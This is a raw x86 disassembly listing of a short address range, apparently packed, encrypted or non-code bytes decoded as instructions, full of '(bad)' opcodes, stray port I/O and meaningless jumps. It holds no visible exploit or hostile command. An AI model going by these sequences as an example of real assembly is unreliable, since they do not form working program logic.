  416d0a:	fnstsw WORD PTR [ebx+0x2b19e3d]
  416d10:	mov    dl,0xe1
  416d12:	in     eax,0x49
  416d14:	dec    esp
  416d15:	add    ch,cl
  416d17:	ins    DWORD PTR es:[edi],dx
  416d18:	inc    edi
  416d19:	sub    eax,0xdc6ac0b9
  416d1e:	pop    ebx
  416d1f:	out    0xa5,al
  416d21:	aas    
  416d22:	mov    bh,0x70
  416d24:	mov    esi,0xdd00e9c1
  416d29:	mov    cl,0xd
  416d2b:	dec    ecx
  416d2c:	mov    ecx,0xe9c32cbc
  416d31:	sbb    al,0x13
  416d33:	pushf  
  416d34:	dec    ebp
  416d35:	jnp    0x416d35
  416d37:	and    eax,0x788db6d9
  416d3c:	data16 mov dh,BYTE PTR [edx-0x72]
  416d40:	pop    ds
  416d41:	pusha  
  416d42:	push   cs
  416d43:	rol    BYTE PTR [ebp+ecx*1+0x7da0123b],0x9d
  416d4b:	out    0x10,al
  416d4d:	xor    al,0x5f
  416d4f:	(bad)  
  416d50:	jl     0x416d5d
  416d52:	sub    ch,0xdc
  416d55:	test   BYTE PTR [edi+0x2e400207],bh
  416d5b:	pop    edx
  416d5c:	inc    esp
  416d5d:	and    ecx,0xffffffe2
  416d60:	retf   
  416d61:	ins    BYTE PTR es:[edi],dx
  416d62:	retf   
  416d63:	xor    al,0xb3
  416d65:	push   esi
  416d66:	mov    esi,0x27c0e680
  416d6b:	mov    edi,DWORD PTR ss:[edi]
  416d6e:	loopne 0x416d99
  416d70:	mov    cl,0xd0
  416d72:	jmp    0x416d91
  416d74:	add    eax,0x68e44faf
  416d79:	neg    BYTE PTR [edx+0x4bdfa04f]
  416d7f:	add    eax,esi
  416d81:	add    esp,DWORD PTR [edx+0x4cb51685]
  416d87:	and    eax,0x4595531
  416d8c:	mov    ebp,0xa32f4c25
  416d91:	pop    ebx
  416d92:	pushf  
  416d93:	jo     0x416d23
  416d95:	js     0x416dd9
  416d97:	iret   
  416d98:	sub    dh,BYTE PTR ds:0xcab58a77
  416d9e:	arpl   WORD PTR [eax+eax*8+0x27],dx
  416da2:	rcr    bh,0x4d
  416da5:	dec    DWORD PTR [esp+ebx*2+0x3d97b917]
  416dac:	inc    edi
  416dad:	inc    edi
  416dae:	aaa    
  416daf:	and    esi,DWORD PTR [edx+edx*1-0x5f87ffad]
  416db6:	mov    ebx,0x7d5e64a6
  416dbb:	cld    
  416dbc:	jge    0x416dd9
  416dbe:	shr    BYTE PTR [esi-0x29],1
  416dc1:	call   0x7d99:0x81dce689
  416dc8:	(bad)  
  416dc9:	adc    BYTE PTR [edx+0x78],dh
  416dcc:	ss jno 0x416df0
  416dcf:	std    
  416dd0:	out    dx,al
  416dd1:	mov    bl,0xbf
  416dd3:	(bad)  
  416dd4:	fmul   DWORD PTR [esi]
  416dd6:	(bad)  
  416dd7:	in     eax,dx
  416dd8:	xchg   cl,cl
  416dda:	cmp    edx,esi
  416ddc:	mov    al,ds:0xd8a4603c
  416de1:	es in  eax,dx
  416de3:	cmp    ecx,esi
  416de5:	gs call 0x2fe27c0d
  416deb:	(bad)  
  416ded:	sub    esi,eax
  416def:	imul   ebp,DWORD PTR [edx],0x14
  416df2:	xor    al,0xdc
  416df4:	sbb    BYTE PTR [ebx+0x57c6a5e1],al
  416dfa:	out    0x46,eax
  416dfc:	(bad)
  416dff:	sbb    BYTE PTR [edi+0x14],al
  416e02:	cmp    DWORD PTR es:[eax],ebp
  416e05:	mov    ebp,0xb4ac8365
  416e0a:	jmp    0x416e12
  416e0c:	mov    eax,DWORD PTR [ebx+0xf]
  416e0f:	lds    ecx,FWORD PTR [ecx]
  416e11:	(bad)  
  416e13:	scas   eax,DWORD PTR es:[edi]
  416e14:	out    dx,eax
  416e15:	sbb    BYTE PTR [ebx-0x1e45890a],bh
  416e1b:	jl     0x416dab
  416e1d:	(bad)  
  416e1e:	or     al,0xd9
  416e20:	pushf  
  416e21:	not    BYTE PTR [edx]
  416e23:	pop    ebp
  416e24:	clc    
  416e25:	retf   0xdfa2
  416e28:	jg     0x416e1b
  416e2a:	or     al,0x4c
  416e2c:	iret   
  416e2d:	jno    0x416db3
  416e2f:	out    0x94,eax
  416e31:	das    
  416e32:	jno    0x416e14
  416e34:	das    
  416e35:	fiadd  DWORD PTR [eax]
  416e37:	pop    eax
  416e38:	mov    edx,0x9537aabc
  416e3d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416e3e:	(bad)  
  416e3f:	pop    edx
  416e40:	fistp  DWORD PTR [edx]
  416e42:	cld    
  416e43:	hlt    
  416e44:	cmp    DWORD PTR [ebx+ebp*1-0x6940198a],esp
  416e4b:	std    
  416e4c:	adc    DWORD PTR [esi+0x29557e77],edi
  416e52:	cmp    al,0xac
  416e54:	mov    dh,0x5f
  416e56:	retf   
  416e57:	inc    ebp
  416e58:	jmp    0x416e52
  416e5a:	push   0xeead542b
  416e5f:	stos   DWORD PTR es:[edi],eax
  416e60:	sub    BYTE PTR [ebx-0x4c70d524],dh
  416e66:	cmp    eax,0xaa63d03f
  416e6b:	jle    0x416e8a
  416e6d:	mov    edi,?
  416e6f:	lahf   
  416e70:	xor    DWORD PTR fs:[ebp+ebp*2+0x60434154],edx
  416e78:	fidiv  DWORD PTR [ecx+0x59]
  416e7b:	xlat   BYTE PTR ds:[ebx]
  416e7c:	cmp    bl,cl
  416e7e:	push   0x5f
  416e80:	pop    es
  416e81:	xor    edx,DWORD PTR [eax+0x7d572940]
  416e87:	fnstcw WORD PTR [edx-0x53905d40]
  416e8d:	add    DWORD PTR [edi-0x3f],eax
  416e90:	(bad)  
  416e91:	retf   0x5d86
  416e94:	sbb    eax,0xad71caae
  416e99:	inc    ebx
  416e9a:	jb     0x416f17
  416e9c:	jo     0x416e30
  416e9e:	xor    al,0x14
  416ea0:	jl     0x416e7a
  416ea2:	pop    esi
  416ea3:	test   al,0x42
  416ea5:	loop   0x416ed2
  416ea7:	inc    ebp
  416ea8:	sub    DWORD PTR [ecx-0x4f950c6a],esp
  416eae:	jecxz  0x416ee7
  416eb0:	lahf   
  416eb1:	add    DWORD PTR [esi+0x7964d032],0x62056a62
  416ebb:	popf   
  416ebc:	pop    ebx
  416ebd:	mov    ss,ebx
  416ebf:	jge    0x416eab
  416ec1:	pop    ebp
  416ec2:	push   eax
  416ec3:	into   
  416ec4:	mov    BYTE PTR ds:0xa1c0441f,dl
  416eca:	sbb    DWORD PTR [eax],ebx
  416ecc:	push   edi
  416ecd:	mov    bh,0x3b
  416ecf:	(bad)  
  416ed0:	nop
  416ed1:	stos   BYTE PTR es:[edi],al
  416ed2:	mov    ebp,0xaa89c975
  416ed7:	mov    DWORD PTR [edi+0x44e7ff32],edi
  416edd:	jae    0x416e73
  416edf:	and    ch,BYTE PTR [eax*4+0xb62965e]
  416ee6:	idiv   DWORD PTR [esi+edx*8-0x21]
  416eea:	retf   
  416eeb:	data16 inc ch
  416eee:	stc    
  416eef:	in     al,dx
  416ef0:	inc    edx
  416ef1:	imul   edx,DWORD PTR [esi],0x2ff2d5c3
  416ef7:	inc    esp
  416ef8:	in     eax,0x7f
  416efa:	cwde   
  416efb:	mov    ah,0x27
  416efd:	stos   BYTE PTR es:[edi],al
  416efe:	outs   dx,BYTE PTR ds:[esi]
  416eff:	jle    0x416f76
  416f01:	imul   esp,DWORD PTR [edx+0x4d3a352],0x3e982ac0
  416f0b:	mov    ecx,DWORD PTR [ebp-0x14]
  416f0e:	shl    BYTE PTR ds:0x205e7bfe,0x76
  416f15:	mov    edx,0x7ceee452
  416f1a:	mov    ds:0xa84c6dbf,al
  416f1f:	xlat   BYTE PTR ds:[ebx]
  416f20:	daa    
  416f21:	fwait
  416f22:	jnp    0x416f86
  416f24:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416f25:	rcl    BYTE PTR [ebx+0xe6e5109],cl
  416f2b:	mov    cl,0x97
  416f2d:	imul   DWORD PTR [ebx+0x40b96d8d]
  416f33:	test   al,0x99
  416f35:	imul   esp,edx,0x3f
  416f38:	imul   ebp,DWORD PTR [eax+ecx*2-0x2f417f8],0xfffffff0
  416f40:	jbe    0x416f9a
  416f42:	dec    ah
  416f44:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416f45:	sahf   
  416f46:	inc    ecx
  416f47:	imul   eax,DWORD PTR [esi+edi*8+0x41e8243a],0xf
  416f4f:	scas   eax,DWORD PTR es:[edi]
  416f50:	rol    DWORD PTR [ebx],0xe0
  416f53:	xchg   edx,eax
  416f54:	push   eax
  416f55:	xor    ebx,ebx
  416f57:	mov    edx,esp
  416f59:	jmp    0x41723d
  416f5e:	cmp    al,0x58
  416f60:	push   esp
  416f61:	add    dh,BYTE PTR [edx+esi*1+0x4a]
  416f65:	data16 (bad) 
  416f68:	and    ch,cl
  416f6a:	inc    ebp
  416f6b:	lds    esi,FWORD PTR [edi+0x3d]
  416f6e:	aaa    
  416f6f:	sbb    DWORD PTR [edi+0x70],edi
  416f72:	mov    ecx,0x1970707e
  416f77:	lods   al,BYTE PTR ds:[esi]
  416f78:	cmp    al,bl
  416f7a:	sbb    ch,dh
  416f7c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416f7d:	jl     0x416f3c
  416f7f:	bound  edx,QWORD PTR [edx]
  416f81:	scas   al,BYTE PTR es:[edi]
  416f82:	(bad)  [edi]
  416f84:	retf   0x7875
  416f87:	push   0x3a28c9a
  416f8c:	mov    BYTE PTR [ebx],bh
  416f8e:	pop    esp
  416f8f:	addr16 xchg esp,eax
  416f91:	mov    bh,0x5a
  416f93:	repnz mov ebx,0x1d8fdde8
  416f99:	lods   eax,DWORD PTR ds:[esi]
  416f9a:	sub    ch,BYTE PTR [ebx+0x57915484]
  416fa0:	ins    DWORD PTR es:[edi],dx
  416fa1:	fnstsw WORD PTR [ebp-0x43]
  416fa4:	mov    tr4,edi
  416fa7:	pop    es
  416fa8:	pop    esi
  416fa9:	pop    ds
  416faa:	adc    esp,DWORD PTR [ecx+0x1a]
  416fad:	(bad)  
  416fae:	not    BYTE PTR [ebx+0x64]
  416fb1:	xchg   esp,eax
  416fb2:	mov    ds:0xf4ff5ed8,al
  416fb7:	pop    ebp
  416fb8:	loope  0x416fed
  416fba:	cdq    
  416fbb:	mov    eax,0x27ff270d
  416fc0:	int    0x95
  416fc2:	or     BYTE PTR [ebx+0x5589f3e9],cl
  416fc8:	nop
  416fc9:	cmp    al,0xd1
  416fcb:	scas   eax,DWORD PTR es:[edi]
  416fcc:	mov    DWORD PTR [edi-0x6ea58b88],edx
  416fd2:	inc    ecx
  416fd3:	or     al,0xd1
  416fd5:	ins    DWORD PTR es:[edi],dx
  416fd6:	fst    DWORD PTR [eax-0xcb783e5]
  416fdc:	mov    WORD PTR [esi+0x29],ds
  416fdf:	outs   dx,DWORD PTR ds:[esi]
  416fe0:	fst    QWORD PTR [edx]
  416fe2:	mov    ecx,0x30c9b2a
  416fe7:	pop    eax
  416fe8:	imul   DWORD PTR ds:0xe87ec01b
  416fee:	sbb    DWORD PTR [edx+0x5a],0x845018a5
  416ff5:	test   eax,0x799b9860
  416ffa:	add    edx,0x27dc4d79
  417000:	xor    ah,cl
  417002:	jo     0x417052
  417004:	mov    dl,0xcd
  417006:	fistp  QWORD PTR [edi+0x49]
  417009:	mov    ds:0xa77a5254,al
  41700e:	fsubr  st(4),st
  417010:	mov    ebp,0x5f08c340
  417015:	mov    ecx,0xdbe1515a
  41701a:	mov    dl,0x7b
  41701c:	cmp    BYTE PTR [esi+0x74],0x2e
  417020:	jmp    0x416ffe
  417022:	out    0xc9,eax
  417024:	inc    eax
  417025:	addr16 pushf 
  417027:	xchg   bh,dl
  417029:	sub    BYTE PTR ds:0xcd2eea4f,dh
  41702f:	sahf   
  417030:	adc    esi,eax
  417032:	jne    0x41708f
  417034:	adc    esp,ecx
  417036:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417037:	cmp    dl,dh
  417039:	mov    ds:0x45c4d118,eax
  41703e:	mov    bl,al
  417040:	fadd   DWORD PTR [eax+0xc]
  417043:	push   edx
  417044:	inc    ebx
  417045:	adc    esi,DWORD PTR [ebx-0x567edbfa]
  41704b:	mov    edx,0xb71a664c
  417050:	or     al,0xc2
  417052:	xchg   ebp,eax
  417053:	neg    DWORD PTR [edx]
  417055:	aam    0xbe
  417057:	out    0xdc,al
  417059:	dec    edx
  41705a:	(bad)  
  41705c:	fcom   DWORD PTR [eax]
  41705e:	loop   0x4170ac
  417060:	(bad)  
  417061:	clc    
  417062:	stos   BYTE PTR es:[edi],al
  417063:	jp     0x4170e4
  417065:	add    DWORD PTR [ecx-0x22f2e30a],esp
  41706b:	and    edx,esi
  41706d:	fldcw  WORD PTR [edi]
  41706f:	inc    esp
  417070:	jle    0x417094
  417072:	ja     0x417066
  417074:	aaa    
  417075:	fidiv  DWORD PTR [eax]
  417077:	cld    
  417078:	ds ins BYTE PTR es:[edi],dx
  41707a:	mov    ds:0xa1645afd,eax
  41707f:	and    eax,0x8e7854a3
  417084:	inc    ebp
  417085:	bound  edi,QWORD PTR [eax+0x4]
  417088:	shl    BYTE PTR [ebx],cl
  41708a:	xchg   BYTE PTR [eax+edx*4-0x58],dl
  41708e:	popa   
  41708f:	xchg   esi,eax
  417090:	repz pop eax
  417092:	pop    esp
  417093:	repnz cmp BYTE PTR [ebx],0x56
  417097:	fistp  QWORD PTR [ebx-0x79]
  41709a:	pop    ebp
  41709b:	mov    esp,0x5aded523
  4170a0:	add    BYTE PTR [ecx+0x63],bh
  4170a3:	mov    bl,0x65
  4170a5:	push   0xffffff9f
  4170a7:	pop    ecx
  4170a8:	aas    
  4170a9:	cmp    edi,DWORD PTR [esi+0x4cc101c3]
  4170af:	or     BYTE PTR [eax],0x36
  4170b2:	pop    ecx
  4170b3:	sub    BYTE PTR [esp+ecx*8+0x5696d849],0x2c
  4170bb:	push   ebx
  4170bc:	ret    0xbf35
  4170bf:	mul    DWORD PTR [esi-0x259347bc]
  4170c5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4170c6:	mov    esp,0xdcdd9334
  4170cb:	dec    edi
  4170cc:	xchg   ebp,eax
  4170cd:	ret    
  4170ce:	pop    esp
  4170cf:	aad    0x21
  4170d1:	push   ecx
  4170d2:	pop    ebp
  4170d3:	inc    ebp
  4170d4:	fcom   QWORD PTR [eax+esi*1+0x72f199ea]
  4170db:	jmp    0x4170f3
  4170dd:	add    dh,bh
  4170df:	dec    esp
  4170e0:	(bad)  
  4170e2:	mov    edi,0x721044f5
  4170e7:	enter  0x2cd6,0x9e
  4170eb:	sbb    al,0xd5
  4170ed:	dec    ebp
  4170ee:	pop    edx
  4170ef:	imul   eax,DWORD PTR [edi+eax*4+0x5],0xc1539fc1
  4170f7:	jp     0x4170c4
  4170f9:	mov    ch,0xdf
  4170fb:	iret   
  4170fc:	or     eax,0xcbdc786a
  417101:	mov    ds:0x5cc6bb52,al
  417106:	lds    ecx,FWORD PTR [esi+0x7bab2e8f]
  41710c:	xchg   BYTE PTR [ebp-0x15],al
  41710f:	scas   al,BYTE PTR es:[edi]
  417110:	cld    
  417111:	cwde   
  417112:	mov    esp,0x90da19c8
  417117:	loop   0x41717d
  417119:	stos   BYTE PTR es:[edi],al
  41711a:	sti    
  41711b:	(bad)  
  41711c:	jbe    0x417113
  41711e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41711f:	mov    esi,0xa5cae992
  417124:	inc    edi
  417125:	sub    eax,0xc62fcea9
  41712a:	scas   al,BYTE PTR es:[edi]
  41712b:	pop    edx
  41712c:	(bad)  
  41712d:	lahf   
  41712e:	add    al,0x88
  417131:	inc    ebx
  417132:	icebp  
  417133:	popf   
  417134:	loopne 0x4171ad
  417136:	jnp    0x417191
  417138:	mov    cl,0xd5
  41713a:	sbb    ebx,DWORD PTR [esi+0x2d]
  41713d:	mov    ch,0xf2
  41713f:	into   
  417140:	idiv   cl
  417142:	and    DWORD PTR [edx],ecx
  417144:	(bad)  
  417145:	sub    DWORD PTR [eax-0x59126d8d],esi
  41714b:	(bad)  
  41714c:	cld    
  41714d:	aas    
  41714e:	rcl    dl,1
  417150:	push   ds
  417151:	jecxz  0x4170fa
  417153:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417154:	fst    QWORD PTR [ecx-0x31]
  417157:	mov    ah,0x43
  417159:	adc    eax,0xf2cfd1f
  41715e:	mov    ds:0x58517612,al
  417163:	(bad)  
  417164:	lock adc ch,0xa5
  417168:	outs   dx,BYTE PTR ds:[esi]
  417169:	add    DWORD PTR [edi+0x43],ebx
  41716c:	jp     0x417183
  41716e:	jmp    0xb619:0xe09b09c7
  417175:	dec    esp
  417176:	jle    0x41716e
  417178:	gs mov bl,0xdc
  41717b:	shl    BYTE PTR [esp+eiz*2+0x3a3ac029],cl
  417182:	jle    0x417186
  417184:	pop    ds
  417185:	out    0x5c,eax
  417187:	mov    ebp,0x8b95cb12
  41718c:	adc    al,0x96
  41718e:	fsubp  st(1),st
  417190:	push   ds
  417191:	shl    edi,1
  417193:	clc    
  417194:	jae    0x4171a6
  417196:	test   DWORD PTR [esi+eax*4+0x706fdb37],ecx
  41719d:	dec    ecx
  41719e:	sbb    al,0xd5
  4171a0:	mov    esi,0x142b81b2
  4171a5:	push   ds
  4171a6:	lods   al,BYTE PTR ds:[esi]
  4171a7:	repz mov ebp,0x73ee72d
  4171ad:	rol    BYTE PTR [edx+eax*4],1
  4171b0:	push   eax
  4171b1:	xor    eax,0xdf4d9451
  4171b6:	pop    edi
  4171b7:	dec    esp
  4171b8:	cwde   
  4171b9:	jmp    0x417223
  4171bb:	pushf  
  4171bc:	adc    al,0xd6
  4171be:	into   
  4171bf:	dec    ecx
  4171c0:	cmp    ebx,DWORD PTR [edi+0x19]
  4171c3:	or     dl,BYTE PTR [edi-0x7b]
  4171c6:	xchg   ebp,eax
  4171c7:	fstp   TBYTE PTR [ebp-0x5b]
  4171ca:	sbb    bh,ah
  4171cc:	icebp  
  4171cd:	and    ch,dh
  4171cf:	repnz hlt 
  4171d1:	and    bh,BYTE PTR [esi+0x19]
  4171d4:	(bad)  
  4171d5:	mov    dh,0x6d
  4171d7:	xchg   ebx,eax
  4171d8:	idiv   BYTE PTR [edx]
  4171da:	xchg   ebp,eax
  4171db:	enter  0x7de6,0x6d
  4171df:	ror    dh,1
  4171e1:	sbb    ecx,esp
  4171e3:	push   esp
  4171e4:	leave  
  4171e5:	bound  edx,QWORD PTR [edi-0x3201e2c7]
  4171eb:	imul   edi,DWORD PTR ds:0x17d3a99c,0x59c9476b
  4171f5:	aas    
  4171f6:	cmp    al,0xaa
  4171f8:	sub    dh,BYTE PTR [ebx-0x53855d3d]
  4171fe:	lods   al,BYTE PTR ds:[esi]
  4171ff:	(bad)  
  417201:	out    dx,al
  417202:	popa   
  417203:	loope  0x4171db
  417205:	cmc    
  417206:	add    ebx,DWORD PTR [esi+0x3d02f67c]
  41720c:	inc    eax
  41720d:	jle    0x417244
  41720f:	scas   eax,DWORD PTR es:[edi]
  417210:	scas   eax,DWORD PTR es:[edi]
  417211:	fild   WORD PTR [edx+0x2c]
  417214:	retf   
  417215:	ret    
  417216:	stos   DWORD PTR es:[edi],eax
  417217:	popa   
  417218:	div    BYTE PTR [eax+0x6e]
  41721b:	(bad)
  41721e:	fucomip st,st(2)
  417220:	hlt    
  417221:	adc    bl,BYTE PTR [ebx+0x59d7d52d]
  417227:	fisubr DWORD PTR [eax]
  417229:	mov    ah,0x3
  41722b:	mov    ebx,0x7793bb0c
  417230:	js     0x417208
  417232:	repz pop edi
  417234:	jnp    0x417274
  417236:	popa   
  417237:	ja     0x41728d
  417239:	cmp    BYTE PTR [ebp+0x434a8bab],ch
  41723f:	add    ebx,DWORD PTR [edx+ebx*1]
  417242:	dec    ebx
  417243:	jmp    0x417527
  417248:	fsubrp st(0),st
  41724a:	(bad)  
  41724b:	stos   BYTE PTR es:[edi],al
  41724c:	mov    gs,WORD PTR [edx-0x16]
  41724f:	ins    BYTE PTR es:[edi],dx
  417250:	leave  
  417251:	pop    ebx
  417252:	sub    al,0x41
  417254:	sbb    DWORD PTR [ecx+0x48],edi
  417257:	pushf  
  417258:	jo     0x417280
  41725a:	jg     0x4172cc
  41725c:	mov    ecx,0x5b70707e
  417261:	retf   0x1365
  417264:	ins    DWORD PTR es:[edi],dx
  417265:	pop    esi
  417266:	lock add ah,dh
  417269:	xchg   edx,eax
  41726a:	add    edx,ebp
  41726c:	fdiv   QWORD PTR [edx]
  41726e:	dec    ecx
  41726f:	or     BYTE PTR [edi+0x57],al
  417272:	adc    DWORD PTR [ebx],eax
  417274:	mov    es,WORD PTR [ecx+0x4d53aa67]
  41727a:	mov    bh,0xea
  41727c:	push   ss
  41727d:	aam    0x84
  41727f:	sub    eax,0xe804538d
  417284:	pusha  
  417285:	outs   dx,BYTE PTR ds:[esi]
  417286:	add    eax,0x3f405a00
  41728b:	repz mov eax,0xfa8efd32
  417291:	pusha  
  417292:	adc    ah,BYTE PTR [edx]
  417294:	clc    
  417295:	pop    esi
  417296:	mov    cl,0x79
  417298:	xor    dh,BYTE PTR [eax+0x44a44732]
  41729e:	out    0x57,eax
  4172a0:	xchg   DWORD PTR [ebx-0x53],ebx
  4172a3:	sub    ecx,DWORD PTR [esi]
  4172a5:	fcomp  DWORD PTR [ebp-0x56]
  4172a8:	and    eax,0x97d2ea2
  4172ad:	test   DWORD PTR [edx-0x6f],esi
  4172b0:	sti    
  4172b1:	inc    BYTE PTR [edx]
  4172b3:	popa   
  4172b4:	dec    eax
  4172b5:	push   0x90bb11a1
  4172ba:	daa    
  4172bb:	cdq    
  4172bc:	ror    BYTE PTR [ebx],1
  4172be:	outs   dx,DWORD PTR ds:[esi]
  4172bf:	dec    esp
  4172c0:	(bad)  
  4172c1:	jbe    0x417335
  4172c3:	inc    esp
  4172c4:	ins    BYTE PTR es:[edi],dx
  4172c5:	xchg   ebx,eax
  4172c6:	mov    ebp,0x9e82f254
  4172cb:	sbb    eax,0xd9348116
  4172d0:	adc    al,0x40
  4172d2:	jb     0x41731c
  4172d4:	dec    esp
  4172d5:	outs   dx,DWORD PTR ds:[esi]
  4172d6:	add    dl,BYTE PTR [ecx]
  4172d8:	and    edx,DWORD PTR [ecx+0x7340f470]
  4172de:	int3   
  4172df:	cld    
  4172e0:	mov    dh,BYTE PTR [edx]
  4172e2:	aad    0x1b
  4172e4:	das    
  4172e5:	lods   al,BYTE PTR ds:[esi]
  4172e6:	mov    bh,0x4e
  4172e8:	cs inc eax
  4172ea:	mov    ebx,0xf4369289
  4172ef:	stos   BYTE PTR es:[edi],al
  4172f0:	lods   eax,DWORD PTR ds:[esi]
  4172f1:	ja     0x4172ae
  4172f3:	xchg   esp,eax
  4172f4:	imul   ebp,DWORD PTR [esi],0xffffffc4
  4172f7:	out    dx,al
  4172f8:	(bad)  
  4172f9:	mov    edx,0x30d365dc
  4172fe:	pop    ds
  4172ff:	or     BYTE PTR [edx+0x16],cl
  417302:	test   al,0x5
  417304:	ja     0x4172eb
  417306:	test   BYTE PTR [ebp-0x1e],bl
  417309:	jnp    0x41728c
  41730b:	cmc    
  41730c:	xchg   esp,eax
  41730d:	loope  0x417359
  41730f:	test   eax,0x115cd80
  417314:	fistp  DWORD PTR [ebx]
  417316:	push   ss
  417317:	lahf   
  417318:	and    eax,0xc2afaf16
  41731d:	pop    ebx
  41731e:	dec    edi
  41731f:	inc    ebx
  417320:	bound  ecx,QWORD PTR [ecx-0x7b]
  417323:	(bad)  
  417324:	jns    0x4172ec
  417326:	lahf   
  417327:	data16 outs dx,BYTE PTR ds:[esi]
  417329:	sbb    DWORD PTR [edi+0x58],esp
  41732c:	and    ebp,DWORD PTR [ecx]
  41732e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41732f:	fistp  QWORD PTR [esi+0x2c9fc87a]
  417335:	mov    DWORD PTR [ebx],eax
  417337:	xchg   edi,eax
  417338:	das    
  417339:	mov    cl,0xd4
  41733b:	xchg   esp,eax
  41733c:	call   0x5c5bb11e
  417341:	imul   eax,DWORD PTR [esi+0x46],0xb3f97229
  417348:	test   BYTE PTR [eax+eax*1-0x6],ch
  41734c:	or     ch,BYTE PTR [ebp+0x78]
  41734f:	outs   dx,DWORD PTR ds:[esi]
  417350:	(bad)  
  417351:	adc    esi,ebx
  417353:	xchg   edi,eax
  417354:	sbb    al,0x37
  417356:	mov    cl,0x3a
  417358:	es jecxz 0x417325
  41735b:	xor    DWORD PTR ds:0x72fca76a,0x5ba574b4
  417365:	js     0x4173bf
  417367:	inc    ebx
  417368:	xor    al,ch
  41736a:	call   FWORD PTR [ecx+0x5ca54058]
  417370:	dec    esi
  417371:	fld    QWORD PTR [esi+0x2ae47432]
  417377:	mov    bl,0x73
  417379:	enter  0x5302,0x48
  41737d:	xchg   ch,dl
  41737f:	test   BYTE PTR [ebp+eiz*1-0x5104cd80],dl
  417386:	sbb    bh,BYTE PTR [ebx-0x3f9e11b8]
  41738c:	mov    edi,0x25e0ec84
  417391:	imul   ebx,DWORD PTR [ebx],0x98802fbe
  417397:	ins    DWORD PTR es:[edi],dx
  417398:	addr16 pusha 
  41739a:	sbb    bh,ch
  41739c:	stos   BYTE PTR es:[edi],al
  41739d:	xchg   ebp,edi
  41739f:	cmp    DWORD PTR [edi+0x60479803],ecx
  4173a5:	imul   edi,DWORD PTR [eax-0x6b],0xfffffff3
  4173a9:	fidivr DWORD PTR ds:0x57af61ed
  4173af:	into   
  4173b0:	cmp    bl,BYTE PTR [edi+0x3f1df416]
  4173b6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4173b7:	aaa    
  4173b8:	loopne 0x4173f1
  4173ba:	dec    ebp
  4173bb:	sub    DWORD PTR [edi+0x3a5fe4da],edx
  4173c1:	xlat   BYTE PTR ds:[ebx]
  4173c2:	cmc    
  4173c3:	mov    cl,0x2c
  4173c5:	pop    ebp
  4173c6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4173c7:	pusha  
  4173c8:	dec    edx
  4173c9:	or     ebx,DWORD PTR [eax-0x57a9a310]
  4173cf:	test   edx,0x6f515b7f
  4173d5:	sub    al,0xf0
  4173d7:	scas   al,BYTE PTR es:[edi]
  4173d8:	add    ecx,ebx
  4173da:	cs push ds
  4173dc:	mov    dl,0xa7
  4173de:	test   DWORD PTR [esi-0x55],eax
  4173e1:	popa   
  4173e2:	jle    0x417419
  4173e4:	mov    bl,0x37
  4173e6:	(bad)  
  4173e7:	mov    al,0xb8
  4173e9:	nop
  4173ea:	loop   0x4173c3
  4173ec:	inc    esi
  4173ed:	stc    
  4173ee:	adc    eax,0xbf81e219
  4173f3:	sbb    DWORD PTR [ecx-0x328801a6],ebp
  4173f9:	add    BYTE PTR [edx],bl
  4173fb:	retf   0xb2bf
  4173fe:	push   esi
  417400:	scas   eax,DWORD PTR es:[edi]
  417401:	or     dl,BYTE PTR [esi+0x7f7c4709]
  417407:	outs   dx,DWORD PTR ds:[esi]
  417408:	inc    eax
  417409:	push   esi
  41740a:	dec    esp
  41740b:	add    BYTE PTR [ebx-0x31],dh
  41740e:	jl     0x41748c
  417410:	mul    DWORD PTR [ecx+0x1f]
  417413:	mov    ch,0xb7
  417415:	xchg   BYTE PTR [ecx],ah
  417417:	lods   al,BYTE PTR ds:[esi]
  417418:	bound  esi,QWORD PTR [ebx+edx*8]
  41741b:	pop    es
  41741c:	push   esi
  41741d:	add    DWORD PTR [esi+edi*4+0x7b],ecx
  417421:	fwait
  417422:	gs mov ch,0xb5
  417425:	imul   eax,DWORD PTR [esi],0xfaf3fdc5
  41742b:	xlat   BYTE PTR ds:[ebx]
  41742c:	jle    0x417430
  41742e:	mov    ah,0xf1
  417430:	mov    ebx,DWORD PTR [edx+0x0]
  417433:	(bad)  
  417435:	dec    esp
  417436:	fsub   DWORD PTR [ecx-0x51]
  417439:	or     cl,0x81
  41743c:	outs   dx,BYTE PTR ds:[esi]
  41743d:	cmp    eax,ebp
  41743f:	sbb    dl,0x36
  417442:	xlat   BYTE PTR ds:[ebx]
  417443:	das    
  417444:	div    BYTE PTR ds:0x3990af62
  41744a:	xchg   ebp,eax
  41744b:	push   cs
  41744c:	or     dh,cl
  41744e:	push   0x17
  417450:	sub    esp,eax
  417452:	rcr    ch,cl
  417454:	fst    st(4)
  417456:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417457:	sub    eax,0x4a7e740c
  41745c:	arpl   si,dx
  41745e:	sub    al,0x3f
  417460:	call   0xd23b:0x87cf26e2
  417467:	(bad)  
  417468:	sub    DWORD PTR [ebx-0x4ca7b058],0xb94aedf2
  417472:	mov    cl,0xbd
  417474:	lods   eax,DWORD PTR ds:[esi]
  417475:	mov    ds:0x8a1b05f7,al
  41747a:	push   esi
  41747b:	mov    ebx,0xab6a3799
  417480:	mov    al,0xd8
  417482:	pop    eax
  417483:	mov    dl,0x1a
  417485:	js     0x417459
  417487:	rcr    cl,1
  417489:	ja     0x417481
  41748b:	push   esi
  41748c:	(bad)  
  41748d:	retf   
  41748e:	out    0x35,eax
  417490:	outs   dx,BYTE PTR ds:[esi]
  417491:	cmp    al,0x71
  417493:	mov    dl,0x48
  417495:	and    BYTE PTR [ebp+0x62],ah
  417498:	mov    eax,0xac4449d8
  41749d:	test   al,0x3e
  41749f:	cmp    BYTE PTR [edx-0x57],al
  4174a2:	stos   BYTE PTR es:[edi],al
  4174a3:	retf   
  4174a4:	fldenv [esi]
  4174a6:	fadd   DWORD PTR [edx+0x6a]
  4174a9:	imul   eax,ebp,0xffffffde
  4174ac:	fcomp  st(0)
  4174ae:	out    dx,al
  4174af:	push   ss
